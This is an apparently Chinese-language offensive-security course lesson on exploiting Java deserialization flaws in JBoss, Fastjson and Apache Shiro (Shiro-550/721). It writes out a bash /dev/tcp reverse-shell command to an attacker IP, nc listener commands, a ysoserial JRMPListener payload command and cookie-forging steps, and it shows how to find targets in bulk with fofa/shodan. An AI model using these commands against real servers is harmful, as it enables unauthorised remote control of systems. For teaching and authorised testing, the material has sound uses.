# 课程P46：第9天：Java反序列化之Fastjson与Shiro漏洞利用 🔐

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_1.png)

在本节课中，我们将学习Java反序列化漏洞中的两个重要案例：Fastjson和Apache Shiro。我们将从漏洞原理、识别方法、检测手段到最终的利用方式，进行系统性的讲解。课程内容力求简单直白，让初学者能够理解并掌握核心概念。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_3.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_5.png)

---

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_7.png)

## 第一部分：利用JBoss反序列化漏洞进行反弹Shell

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_9.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_11.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_13.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_15.png)

上一节我们介绍了如何利用反序列化漏洞执行命令。本节中，我们来看看如何将命令执行升级为反弹Shell，从而获得一个交互式的命令行控制权。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_17.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_19.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_21.png)

### 反弹Shell原理与步骤

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_23.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_25.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_26.png)

反弹Shell是指让目标服务器主动连接攻击者控制的机器，并提供一个Shell会话。以下是实现步骤：

**1. 在公网服务器上监听端口**

首先，需要在攻击者拥有的一台公网IP服务器上，使用`netcat`（nc）工具监听一个端口，等待目标服务器的连接。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_28.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_30.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_32.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_34.png)

*   **Linux系统命令示例：**
    ```bash
    nc -lvp 1234
    ```
*   **参数解释：**
    *   `-l`: 指定nc处于监听模式，作为服务端。
    *   `-v`: 输出详细交互信息。
    *   `-p 1234`: 指定监听的端口号为1234。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_36.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_38.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_40.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_42.png)

**2. 在目标服务器上执行反弹Shell命令**

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_44.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_46.png)

接着，需要利用已存在的漏洞（如JBoss反序列化漏洞），在目标服务器上执行一条特殊的命令。这条命令会让目标服务器连接到我们监听的端口。

*   **常用的反弹Shell命令：**
    ```bash
    bash -i >& /dev/tcp/[攻击者公网IP]/[监听端口] 0>&1
    ```
*   **命令解释：**
    *   `bash -i`: 产生一个交互式的Shell。
    *   `>& /dev/tcp/[IP]/[端口]`: 在Linux中，`/dev/tcp/[IP]/[端口]`是一个特殊的设备文件，打开它相当于发起一个socket连接。`>&`将标准输出和标准错误都重定向到这个连接。
    *   `0>&1`: 将标准输入也重定向到该连接，从而实现完全的交互。

**3. 接收Shell并执行命令**

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_48.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_50.png)

当目标服务器执行了上述命令后，它就会连接到攻击者服务器的1234端口。此时，在攻击者的`nc`监听窗口，就会获得目标服务器的一个Shell权限，可以执行任意系统命令，例如`id`或`whoami`。

通过以上步骤，我们便成功利用了反序列化漏洞获取了目标服务器的控制权。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_52.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_54.png)

---

## 第二部分：JBoss漏洞识别与利用

上一节我们完成了反弹Shell的实践。本节中，我们来系统了解JBoss应用服务器及其历史漏洞，并学习如何识别和利用它。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_56.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_58.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_60.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_62.png)

### JBoss简介与历史漏洞

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_64.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_65.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_67.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_69.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_71.png)

JBoss是一个基于J2EE的开源应用服务器，常用于管理EJB容器。它通常与Tomcat或Jetty绑定使用以支持Web服务。历史上，JBoss出现过多个严重漏洞：

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_73.png)

以下是部分高危漏洞列表：
*   **访问控制不严漏洞**：例如JMX Console未授权访问导致GetShell。
*   **弱口令与默认配置**：管理控制台使用默认或弱口令。
*   **反序列化漏洞**：例如CVE-2017-12149和CVE-2017-7504，可直接导致远程代码执行。

### 如何识别JBoss服务

识别一个网站是否使用了JBoss，可以通过以下方法：

1.  **默认端口与页面**：JBoss默认开放8080端口（HTTP协议）。访问`http://目标IP:8080/`，其默认页面通常包含“JBoss”相关标识。
2.  **特征图标**：JBoss的Web管理界面有特定的图标和样式。
3.  **使用搜索引擎**：使用`fofa`、`shodan`等网络空间搜索引擎，搜索`title=“JBoss”`或`port=“8080” && body=“jboss”`等特征，可以批量发现目标。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_75.png)

### 漏洞检测与利用工具

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_77.png)

对于CVE-2017-12149这类反序列化漏洞，可以使用自动化脚本进行批量检测和利用。

**1. 批量检测脚本**

使用Python脚本，将目标IP和端口列表放入`target.txt`文件，运行脚本即可检测多个漏洞。
```bash
python3 jboss_scan.py
```
脚本会检测目标是否存在JMX Console未授权、CVE-2017-7504、CVE-2017-12149等漏洞。

**2. 手工验证与利用**

对于单个目标，可以尝试访问特定路径来验证漏洞，例如访问`/invoker/readonly`，如果返回500状态码，则可能存在漏洞。

利用过程通常借助公开的漏洞利用脚本（Exp）。操作流程如下：
*   在攻击机监听端口：`nc -lvp 1234`
*   运行利用脚本，指定目标URL、攻击机IP和监听端口。
*   脚本会向目标发送恶意序列化数据，成功后将Shell反弹到攻击机。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_79.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_80.png)

> **注意**：实际演练中，目标服务可能因攻击而崩溃或不稳定，需根据实际情况调整。

---

## 第三部分：Fastjson反序列化漏洞

上一节我们探讨了JBoss的漏洞。本节中，我们转向另一个广泛使用的Java组件——Fastjson，并学习其反序列化漏洞的发现与初步检测。

### Fastjson简介与漏洞原理

Fastjson是阿里巴巴开源的一款高性能JSON解析器。其反序列化漏洞在近年来备受关注，特别是1.2.24和1.2.47等版本。

**漏洞核心原理**：
Fastjson在解析JSON字符串时，支持通过`@type`属性指定要反序列化的类。攻击者可以构造恶意的JSON字符串，利用这个特性让服务端实例化并执行恶意类中的方法（如`setter`、`getter`或构造函数），从而实现远程代码执行。

*   **1.2.24及以前版本**：直接利用`@type`指定恶意类即可。
*   **1.2.24至1.2.47之间版本**：增加了反序列化黑名单，但存在绕过方法。

### Fastjson漏洞的识别与发现

由于Fastjson用于处理JSON数据，因此识别它的关键在于找到使用JSON进行通信的接口。

**识别特征：**
1.  **HTTP请求头**：观察请求的`Content-Type`字段。如果其值为`application/json`，则该接口很可能使用了Fastjson或其他JSON库。
    ```
    Content-Type: application/json
    ```
2.  **请求体格式**：请求体（Body）的数据格式为标准的JSON对象。

**漏洞检测方法（无回显检测）：**
由于漏洞执行命令可能没有直接回显，通常借助DNSLog平台进行检测。
1.  从DNSLog平台（如`dnslog.cn`）获取一个临时子域名。
2.  构造一个特殊的JSON格式的POC（漏洞验证代码），其中包含向该子域名发起DNS查询的命令。
3.  将POC作为数据包发送到疑似存在漏洞的接口。
4.  查看DNSLog平台是否有该子域名的解析记录。如果有，则证明目标存在Fastjson反序列化漏洞，并且能够执行系统命令。

> **提示**：具体的漏洞利用（GetShell）方法涉及更复杂的链构造，将在后续课程中详细讲解。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_82.png)

---

## 第四部分：Apache Shiro反序列化漏洞

上一节我们介绍了Fastjson的漏洞检测。本节中，我们学习另一个重要的安全框架——Apache Shiro的反序列化漏洞，这是近年来另一个非常热门的漏洞类型。

### Shiro简介与相关漏洞

Apache Shiro是一个强大且易用的Java安全框架，提供认证、授权、加密和会话管理等功能。其历史上最著名的两个反序列化漏洞是：

1.  **Shiro-550 (CVE-2016-4437)**：
    *   **原因**：Shiro提供了“记住我”（Remember Me）功能。用户登录后，服务端会生成一个加密的Cookie。攻击者可以利用已知的AES加密密钥，伪造恶意的Remember Me Cookie，触发Java反序列化漏洞。
2.  **Shiro-721 (CVE-2019-12422)**：
    *   **原因**：同样是Remember Me功能，但采用了AES-CBC加密模式。攻击者可以通过Padding Oracle攻击方式，逐步破解出加密密钥，进而伪造恶意Cookie。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_84.png)

### 如何识别使用了Shiro的网站

1.  **网站功能**：登录页面存在 **“记住我”** （Remember Me）复选框。
2.  **抓包分析**：
    *   正常登录后，查看服务器返回的`Set-Cookie`响应头，如果存在`rememberMe=deleteMe`字段，则很可能使用了Shiro。
    *   或者，在请求的Cookie中手动添加`rememberMe=1`，如果响应包中也返回了`rememberMe=deleteMe`，则基本可以确认。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_86.png)

### Shiro漏洞的检测（以Shiro-550为例）

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_88.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_90.png)

由于漏洞执行无回显，检测同样依赖DNSLog等外带平台。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_92.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_94.png)

**1. 使用图形化工具检测**
   *   工具如`ShiroExploit`，界面简单。输入目标URL和从DNSLog平台获取的子域名，点击检测。
   *   如果DNSLog平台收到解析请求，则说明目标可能存在Shiro反序列化漏洞。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_96.png)

**2. 使用Python脚本检测**
   *   运行脚本，指定目标URL和一条用于检测的命令（如`ping dnslog子域名`）。
   *   同样通过观察DNSLog是否有记录来判断漏洞是否存在。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_98.png)

### Shiro漏洞的利用（获取Shell）

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_100.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_101.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_103.png)

在确认漏洞存在后，可以进行深度利用以获取目标服务器的Shell。

**1. 使用集成化工具一键利用**
   一些高级工具（如某些GUI攻击框架）集成了漏洞利用模块。只需输入目标URL、攻击者接收Shell的IP和端口，工具会自动完成序列化Payload生成、Cookie伪造和发送，最终将Shell反弹到指定端口。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_105.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_107.png)

**2. 手工利用流程**
   手工利用更能理解原理，主要步骤为：
   *   **监听端口**：攻击机使用`nc -lvp [端口]`监听。
   *   **生成恶意Payload**：使用`ysoserial`等工具生成包含反弹Shell命令的序列化数据，并启动一个JRMP监听服务。
     ```bash
     java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 "bash -c {echo,base64编码的反弹Shell命令}|{base64,-d}|{bash,-i}"
     ```
     > **注意**：反弹Shell命令需先进行Base64编码，因为Java运行时环境对管道符等支持不友好。
   *   **生成恶意Cookie**：使用专用Python脚本，向上面启动的JRMP服务（`攻击机IP:1099`）发起请求，生成加密后的恶意Remember Me Cookie值。
     ```bash
     python2 shiro_tool.py 攻击机IP:1099
     ```
   *   **发送Cookie**：在登录请求的Cookie字段中，替换`rememberMe`的值为上一步生成的恶意Cookie值，然后发送请求。
   *   **接收Shell**：如果一切正确，攻击机的NC监听端口会收到目标服务器反弹回来的Shell。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_109.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_111.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_113.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_115.png)

> **注意**：手工利用步骤较多，任何环节出错（如IP端口错误、命令编码问题、工具版本不匹配）都可能导致失败，需要仔细排查。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_117.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_119.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_121.png)

---

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_123.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_125.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_127.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_129.png)

## 课程总结 🎯

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_131.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_133.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_135.png)

本节课中我们一起学习了Java反序列化漏洞中的两个核心案例：Fastjson和Apache Shiro。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_137.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_139.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_141.png)

*   我们首先**回顾了如何将JBoss的命令执行漏洞升级为反弹Shell**，获得了对服务器的交互式控制权。
*   接着，我们系统性地了解了**JBoss的历史漏洞、识别方法以及利用工具**。
*   然后，我们深入探讨了**Fastjson反序列化漏洞的原理**，并学习了如何通过观察`Content-Type`和借助DNSLog平台来**发现和初步验证**这类漏洞。
*   最后，我们重点讲解了**Apache Shiro框架的Shiro-550/721漏洞**。从识别网站是否使用Shiro，到使用工具或手工方式**检测漏洞**，再到最终通过**伪造Remember Me Cookie实现反弹Shell**的完整利用链，进行了详细的剖析。

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_143.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_145.png)

![](img/9ff9a5c64bf9db4f1e5b4ea16aa8acd1_147.png)

通过本课的学习，你应该对这两种常见且危险的Java反序列化漏洞有了基本的认识，并掌握了从信息收集、漏洞识别到验证利用的基本流程。